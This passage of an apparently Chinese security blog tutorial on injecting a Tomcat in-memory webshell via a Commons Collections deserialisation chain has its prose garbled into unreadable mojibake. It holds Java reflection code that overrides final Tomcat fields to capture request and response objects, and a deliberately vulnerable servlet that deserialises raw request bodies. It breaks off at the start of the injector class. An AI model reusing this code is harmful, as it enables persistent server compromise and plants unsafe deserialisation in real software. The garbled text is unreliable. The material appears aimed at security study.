<p>ç„¶ååœ¨<code>ApplicationFilterChain#internalDoFilter</code>æ–¹æ³•ä¸­ï¼Œåœ¨æ‰§è¡ŒServletçš„serviceæ–¹æ³•å‰ï¼Œå…ˆå¯¹ApplicationDispatcher.WRAP_SAME_OBJECT çš„å€¼è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœå€¼ä¸ºtrueï¼Œå°±å°†å½“å‰requestå’Œresponseåˆ†åˆ«å­˜æ”¾åˆ°lastServicedRequestå’ŒlastServicedResponseé‡Œé¢ã€‚<img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417013421665.png" alt="image-20230417013421665"  />
</p>
<p>æœ€ååœ¨try-catch-finallyè¯­å¥ä¸­ï¼Œåœ¨ finally ä¸­åˆå°† lastServicedRequest å’Œ lastServicedResponse è®¾ä¸ºäº† nullã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230417112557127.png" alt="image-20230417112557127"  />
</p>
<p>å› æ­¤æ€è·¯å°±å¾ˆæ˜ç¡®ï¼Œé€šè¿‡åå°„ï¼Œä¿®æ”¹<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>çš„å€¼ä¸ºfalse,ç„¶ååå°„å¯¹<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>ä¸¤ä¸ªé™æ€å˜é‡è¿›è¡Œåˆå§‹åŒ–ï¼Œè¿™æ ·å½“ç¨‹åºæ‰§è¡Œåˆ°<code>ApplicationFilterChain#internalDoFilter()</code>æ–¹æ³•çš„æ—¶å€™ï¼Œå°±è·å–äº†requestå’Œresponseã€‚</p>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">static</span> <span style="color:#fff;font-weight:bold">void</span> updateFinalField(Class aclass,String filedName){
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> field = aclass.<span style="color:#007f7f">getDeclaredField</span>(filedName);
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// ä¿®æ”¹final å˜é‡çš„å€¼åå°„æµç¨‹
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Field</span> modifiersField = field.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;modifiers&#34;</span>);
</span></span><span style="display:flex;"><span>        modifiersField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        modifiersField.<span style="color:#007f7f">setInt</span>(field,field.<span style="color:#007f7f">getModifiers</span>() &amp; ~java.<span style="color:#007f7f">lang</span>.<span style="color:#007f7f">reflect</span>.<span style="color:#007f7f">Modifier</span>.<span style="color:#007f7f">FINAL</span>);
</span></span><span style="display:flex;"><span>        field.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>      	<span style="color:#007f7f">// å¯¹äºWRAP_SAME_OBJECT,éœ€è¦è®¾ç½®å€¼ä¸ºtrue.
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        <span style="color:#fff;font-weight:bold">if</span>(filedName == <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>){
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">if</span>(!field.<span style="color:#007f7f">getBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>)){
</span></span><span style="display:flex;"><span>                field.<span style="color:#007f7f">setBoolean</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">else</span>{
</span></span><span style="display:flex;"><span>          	<span style="color:#007f7f">// å¯¹äºlastServicedRequest å’Œ lastServicedResponse æˆ‘ä»¬éœ€è¦å°†å…¶åˆå§‹åŒ–ThreadLocal()
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>            <span style="color:#fff;font-weight:bold">if</span>(field.<span style="color:#007f7f">get</span>(<span style="color:#fff;font-weight:bold">null</span>) == <span style="color:#fff;font-weight:bold">null</span>){
</span></span><span style="display:flex;"><span>               field.<span style="color:#007f7f">set</span>(<span style="color:#fff;font-weight:bold">null</span>,<span style="color:#fff;font-weight:bold">new</span> ThreadLocal());
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>        e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">static</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>        <span style="color:#007f7f">// ä¿®æ”¹WRAP_SAME_OBJECT å€¼ä¸º true
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>        String WRAP_SAME_OBJECT_NAME = <span style="color:#0ff;font-weight:bold">&#34;WRAP_SAME_OBJECT&#34;</span>;
</span></span><span style="display:flex;"><span>        String lastServicedRequestName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedRequest&#34;</span>;
</span></span><span style="display:flex;"><span>        String lastServicedResponseName = <span style="color:#0ff;font-weight:bold">&#34;lastServicedResponse&#34;</span>;
</span></span><span style="display:flex;"><span>        Class&lt;?&gt; applicationDispatcherClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationDispatcher&#34;</span>);
</span></span><span style="display:flex;"><span>        Class&lt;?&gt; applicationFilterChainClass = Class.<span style="color:#007f7f">forName</span>(<span style="color:#0ff;font-weight:bold">&#34;org.apache.catalina.core.ApplicationFilterChain&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        updateFinalField(applicationDispatcherClass,WRAP_SAME_OBJECT_NAME);
</span></span><span style="display:flex;"><span>        updateFinalField(applicationFilterChainClass,lastServicedRequestName);
</span></span><span style="display:flex;"><span>        updateFinalField(applicationFilterChainClass,lastServicedResponseName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>        e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="å†…å­˜é©¬å®ç°">å†…å­˜é©¬å®ç°<a hidden class="anchor" aria-hidden="true" href="#å†…å­˜é©¬å®ç°">#</a></h2>
<p>å®ç°å†…å­˜é©¬çš„å¤§è‡´æ€è·¯ï¼š</p>
<p>1ã€æˆ‘ä»¬é€šè¿‡åå°„å®ç°<code>lastServicedRequest</code>ã€ <code>lastServicedResponse </code>åˆå§‹åŒ–å¹¶å­˜å‚¨requestå’Œresponseã€‚</p>
<p>2ã€æ ¹æ®è·å¾—åˆ°çš„lastServicedRequestå’ŒlastServicedResponseè·å–requestå’Œresponseï¼Œç„¶ååˆ©ç”¨requestè·å–servletContextï¼Œç„¶ååŠ¨æ€æ³¨å†ŒFilterã€Servletã€Listernerç­‰ç»„ä»¶ã€‚</p>
<p>æˆ‘ä»¬è¿™é‡Œæ˜¯ç»“åˆCC11é“¾å®ç°ååºåˆ—åŒ–æ³¨å†ŒFilterå†…å­˜é©¬ï¼Œå…¶ä»–ç§ç±»å†…å­˜é©¬çš„å®ç°å¤§åŒå°å¼‚ã€‚</p>
<h3 id="æ¼æ´ç¯å¢ƒ">æ¼æ´ç¯å¢ƒ<a hidden class="anchor" aria-hidden="true" href="#æ¼æ´ç¯å¢ƒ">#</a></h3>
<p>åˆ›å»ºä¸€ä¸ª<code>Servlet</code>ï¼Œå­˜åœ¨ä¸€ä¸ªååºåˆ—åŒ–æ³¨å…¥ç‚¹ã€‚</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">package</span> servlet;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.ServletException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.annotation.WebServlet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServlet;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> javax.servlet.http.HttpServletResponse;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.IOException;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.InputStream;
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">import</span> java.io.ObjectInputStream;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#007f7f">/**
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @ClassName EvilServlet
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Description TODO
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Author reus09
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Date 2023/4/16 21:39
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> * @Version 1.0
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"> **/</span>
</span></span><span style="display:flex;"><span>@WebServlet(<span style="color:#0ff;font-weight:bold">&#34;/evil&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> EvilServlet <span style="color:#fff;font-weight:bold">extends</span> HttpServlet {
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> doGet(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>        InputStream inputStream = req.<span style="color:#007f7f">getInputStream</span>();
</span></span><span style="display:flex;"><span>        ObjectInputStream objectInputStream = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(inputStream);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            objectInputStream.<span style="color:#007f7f">readObject</span>();
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,Reus09!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">protected</span> <span style="color:#fff;font-weight:bold">void</span> doPost(HttpServletRequest req, HttpServletResponse resp) <span style="color:#fff;font-weight:bold">throws</span> ServletException, IOException {
</span></span><span style="display:flex;"><span>        InputStream inputStream = req.<span style="color:#007f7f">getInputStream</span>();
</span></span><span style="display:flex;"><span>        ObjectInputStream objectInputStream = <span style="color:#fff;font-weight:bold">new</span> ObjectInputStream(inputStream);
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            objectInputStream.<span style="color:#007f7f">readObject</span>();
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        resp.<span style="color:#007f7f">getWriter</span>().<span style="color:#007f7f">write</span>(<span style="color:#0ff;font-weight:bold">&#34;Hello,Reus09!&#34;</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨<code>pom.xml</code>é‡Œé¢æ·»åŠ <code>commons-collections</code>ä¾èµ–</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="font-weight:bold">&lt;dependency&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;groupId&gt;</span>commons-collections<span style="font-weight:bold">&lt;/groupId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;artifactId&gt;</span>commons-collections<span style="font-weight:bold">&lt;/artifactId&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="font-weight:bold">&lt;version&gt;</span>3.1<span style="font-weight:bold">&lt;/version&gt;</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">&lt;/dependency&gt;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ååºåˆ—åŒ–æ³¨å…¥">ååºåˆ—åŒ–æ³¨å…¥<a hidden class="anchor" aria-hidden="true" href="#ååºåˆ—åŒ–æ³¨å…¥">#</a></h3>
<h4 id="æ­¥éª¤ä¸€">æ­¥éª¤ä¸€<a hidden class="anchor" aria-hidden="true" href="#æ­¥éª¤ä¸€">#</a></h4>
<p>æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªç»§æ‰¿äº†AbstractTransletï¼ˆå› ä¸ºéœ€è¦æºå¸¦æ¶æ„å­—èŠ‚ç åˆ°æœåŠ¡ç«¯åŠ è½½æ‰§è¡Œï¼‰çš„TomcatEchoInjectç±»ï¼Œåœ¨å…¶ä»£ç é‡Œé¢é€šè¿‡åå°„ä¿®æ”¹<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>ä¸ºtrueï¼Œå¹¶ä¸”å¯¹<code>lastServicedRequest</code>å’Œ<code>lastServicedResponse</code>è¿™ä¸¤ä¸ªThreadLocalè¿›è¡Œåˆå§‹åŒ–ï¼Œä»£ç ä¸æˆ‘ä»¬åœ¨ å›æ˜¾é—®é¢˜ ç« èŠ‚çš„ä»£ç åŸºæœ¬ä¸€è‡´</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
